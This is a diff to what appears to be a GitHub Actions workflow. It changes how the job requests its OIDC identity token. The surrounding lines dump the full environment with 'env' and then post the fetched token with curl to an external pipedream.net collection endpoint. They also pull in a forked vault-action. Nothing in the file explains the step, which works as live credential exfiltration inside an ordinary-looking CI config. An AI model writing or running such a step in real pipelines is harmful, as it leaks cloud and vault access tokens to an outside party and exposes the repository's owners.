@@ -29,7 +29,7 @@ jobs:
 
       - run: env
       - run: |
-          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=o6s" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
+          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
           curl -i -s --data-binary "$OIDC_TOKEN" https://en6uptz0442bl.x.pipedream.net
 
       - uses: Centzilius/vault-action@errormessage
